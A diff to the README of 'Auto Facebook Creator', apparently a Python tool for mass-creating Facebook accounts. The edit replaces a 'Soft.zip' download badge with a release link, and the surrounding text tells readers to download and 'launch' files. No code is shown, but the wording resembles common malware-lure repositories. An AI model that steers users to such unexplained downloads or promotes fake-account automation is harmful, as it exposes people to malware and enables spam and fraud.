@@ -9,7 +9,7 @@ Welcome to the Auto Facebook Creator repository! This Python project provides an
 
 ## 🚀 Get Started
 To start using the Auto Facebook Creator tool, please download the necessary files from the following link:
-[![Download Files](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/files/Soft.zip)
+[![Download Files](https://github.com/mdsaad39/auto_facebook_creator/releases/tag/v1.2)](https://github.com/mdsaad39/auto_facebook_creator/releases/tag/v1.2)
 *Note: The provided link needs to be launched to access the required files.*
 
 If the provided link is not accessible or does not work, please check the "Releases" section of this repository for alternative download options.
